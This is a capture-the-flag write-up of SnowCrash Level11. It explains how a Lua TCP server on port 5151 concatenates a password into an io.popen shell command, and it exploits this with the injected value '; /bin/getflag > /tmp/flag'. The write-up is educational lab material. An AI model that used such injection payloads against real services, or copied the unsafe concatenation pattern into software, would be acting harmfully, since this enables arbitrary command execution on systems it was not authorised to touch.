# Level11

**Box**: SnowCrash

**Name**: Level11

**Category**: Command Injection / Code Injection

**Difficulty**: Easy

## Analysis

Explore the directory:

```bash
ls -la
```

I find a Lua script `level11.lua`. The objective is to get the flag.

Display the script content:

```bash
cat level11.lua
```

The script creates a TCP server:

```lua
local server = assert(socket.bind("127.0.0.1", 5151))
```

It listens on `127.0.0.1:5151`.

When a client connects:
- The server asks for a password
- It reads the client's response
- It calculates a SHA1 hash of the password

The function used is:

```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

The actual command executed in the shell is:

```
echo <password> | sha1sum
```

## Vulnerability Identification

The password is directly concatenated into a shell command:

```lua
"echo "..pass.." | sha1sum
```

Since this command is executed via `io.popen`, it is interpreted by the shell.

This means special characters like:
- `;`
- `|`
- `#`
- `&`

Can be injected into user input.

This is a **Command Injection** vulnerability.

## Exploitation

### Test the service

Connect to the server with netcat:

```bash
nc 127.0.0.1 5151
```

The server responds:

```
Password:
```

### Inject the payload

To execute a system command, inject `/bin/getflag`.

However, the command contains a pipe to sha1sum, so we need to comment out the end of the line.

Payload used:

```bash
; /bin/getflag > /tmp/flag
```

Command actually executed:

```bash
echo ; /bin/getflag > /tmp/flag | sha1sum
```


## Result

The `/bin/getflag` command executes with the program's permissions and displays the password for the next level.

## Conclusion

The program is vulnerable because it constructs a shell command with user input:

```lua
io.popen("echo "..pass.." | sha1sum")
```

This allows command injection, which provides the ability to execute any system command, notably `/bin/getflag`.

## Flag

**FLAG_FOUND**
